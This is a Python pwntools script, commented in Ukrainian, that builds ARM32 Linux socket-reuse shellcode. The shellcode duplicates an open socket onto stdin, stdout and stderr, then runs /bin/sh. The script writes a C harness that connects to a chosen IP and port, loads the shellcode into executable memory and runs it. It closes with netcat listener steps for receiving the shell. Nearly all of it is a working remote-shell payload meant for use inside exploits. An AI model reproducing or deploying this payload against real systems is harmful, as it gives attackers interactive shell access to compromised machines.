#!/usr/bin/env python3
from pwn import *
context.arch = 'arm'
context.bits = 32
context.os = 'linux'
context.endian = 'little'

# Параметри
SOCKET_FD = 3  # Дескриптор файлу вже відкритого сокета
              # Це значення може змінюватися залежно від вашого експлойта

# Створюємо шеллкод для отримання shell через відкритий сокет
assembly = f"""
.arm
    /* Зберігаємо FD сокета */
    mov r4, #{SOCKET_FD}  /* r4 = наш сокет */
    
    /* dup2(sockfd, 0) - перенаправляємо STDIN */
    mov r0, r4      /* r0 = sockfd */
    mov r1, #0      /* r1 = STDIN (0) */
    mov r7, #63     /* r7 = dup2 syscall */
    svc #0
    
    /* dup2(sockfd, 1) - перенаправляємо STDOUT */
    mov r0, r4      /* r0 = sockfd */
    mov r1, #1      /* r1 = STDOUT (1) */
    mov r7, #63     /* r7 = dup2 syscall */
    svc #0
    
    /* dup2(sockfd, 2) - перенаправляємо STDERR */
    mov r0, r4      /* r0 = sockfd */
    mov r1, #2      /* r1 = STDERR (2) */
    mov r7, #63     /* r7 = dup2 syscall */
    svc #0
    
    /* execve("/bin/sh", NULL, NULL) */
    adr r0, shell_str    /* r0 = адреса "/bin/sh" */
    mov r1, #0           /* r1 = NULL (немає аргументів) */
    mov r2, #0           /* r2 = NULL (немає змінних середовища) */
    mov r7, #11          /* r7 = execve syscall */
    svc #0
    
    /* exit(0) - на випадок, якщо execve не вдалося */
    mov r0, #0      /* exit status */
    mov r7, #1      /* exit syscall */
    svc #0
    
shell_str:
    .asciz "/bin/sh"
"""

# Компілюємо шеллкод
shellcode = asm(assembly)

# Виводимо результат
print("Shell with Socket Reuse Shellcode для ARM32:")
print("\nДовжина shellcode: {} байт".format(len(shellcode)))
print("\nУ шістнадцятковому форматі:")
print("\\x" + "\\x".join("{:02x}".format(c) for c in shellcode))

# Створюємо тестовий C-файл
shellcode_hex = "\\x" + "\\x".join("{:02x}".format(c) for c in shellcode)
c_code = """
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

// Функція для створення сокета та відкриття з'єднання
int create_socket(const char* ip, int port) {
    int sockfd;
    struct sockaddr_in addr;
    
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("socket");
        return -1;
    }
    
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &addr.sin_addr);
    
    if (connect(sockfd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("connect");
        close(sockfd);
        return -1;
    }
    
    return sockfd;
}

int main(int argc, char *argv[]) {
    // Shell with Socket Reuse Shellcode
    unsigned char shellcode[] = "%s";
    
    // Параметри для з'єднання
    const char* target_ip = "127.0.0.1";
    int target_port = 4444;
    
    if (argc > 1) target_ip = argv[1];
    if (argc > 2) target_port = atoi(argv[2]);
    
    printf("Довжина shellcode: %%zu байт\\n", sizeof(shellcode) - 1);
    printf("Підключення до %%s:%%d...\\n", target_ip, target_port);
    
    // Створюємо з'єднання для тестування
    int sockfd = create_socket(target_ip, target_port);
    if (sockfd < 0) {
        fprintf(stderr, "Помилка при створенні з'єднання\\n");
        return 1;
    }
    
    printf("З'єднання встановлено! Дескриптор сокета: %%d\\n", sockfd);
    
    // Налаштовуємо дескриптор сокета у відповідності з SOCKET_FD із шеллкоду
    // В реальному експлойті цей крок не потрібен, оскільки сокет вже відкритий
    if (sockfd != %d) {
        printf("Потрібно налаштувати дескриптор сокета (%%d -> %d)\\n", sockfd, %d);
        // Дублюємо сокет до потрібного FD
        for (int i = 0; i <= %d; i++) {
            if (i != sockfd) close(i);
        }
        dup2(sockfd, %d);
        close(sockfd);
        sockfd = %d;
        printf("Дескриптор сокета тепер: %%d\\n", sockfd);
    }
    
    printf("Виконання shellcode...\\n");
    printf("Після цього ви отримаєте shell на з'єднанні.\\n");
    
    // Виділяємо пам'ять з правами на виконання
    void *mem = mmap(NULL, sizeof(shellcode),
                     PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (mem == MAP_FAILED) {
        perror("mmap");
        return 1;
    }
    
    // Копіюємо shellcode у виділену пам'ять
    memcpy(mem, shellcode, sizeof(shellcode));
    
    // Виконуємо shellcode
    ((void(*)())mem)();
    
    // Звільняємо пам'ять (до цього рядка ми не дійдемо, якщо execve успішний)
    munmap(mem, sizeof(shellcode));
    return 0;
}
""" % (shellcode_hex, SOCKET_FD, SOCKET_FD, SOCKET_FD, SOCKET_FD, SOCKET_FD, SOCKET_FD)

# Записуємо C код у файл
with open("socket_reuse_shellcode.c", "w") as f:
    f.write(c_code)

print("\nСтворено файл socket_reuse_shellcode.c для тестування shellcode")
print("Компілюйте його за допомогою:")
print("arm-linux-gnueabihf-gcc -o socket_reuse_shellcode socket_reuse_shellcode.c")
print("qemu-arm -L /usr/arm-linux-gnueabihf ./socket_reuse_shellcode")

# Інструкції з налаштування сервера для тестування
print("\nДля тестування налаштуйте netcat слухач:")
print("1. На машині з IP 127.0.0.1 запустіть:")
print("   nc -lvnp 4444")
print("2. В іншому терміналі запустіть програму socket_reuse_shellcode")
print("3. Після виконання шеллкоду ви отримаєте shell у вікні netcat")